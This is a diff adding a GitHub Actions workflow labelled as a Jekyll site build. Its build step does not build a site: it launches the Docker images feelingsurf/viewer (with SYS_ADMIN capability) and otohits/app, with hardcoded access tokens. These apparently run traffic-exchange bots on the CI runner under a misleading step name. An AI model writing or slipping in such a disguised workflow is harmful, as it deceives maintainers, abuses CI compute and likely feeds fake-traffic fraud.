@@ -1,0 +1,19 @@
+name: Jekyll site CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    - name: Build the site in the jekyll/builder container
+      run: |
+        docker run -d -e access_token=2733571e514d9a327a50e33acc08303e --cap-add SYS_ADMIN feelingsurf/viewer:stable
+        docker run -e APPLICATION_KEY=286bb1df-100a-4f6d-88a5-3788a91db986 otohits/app:latest
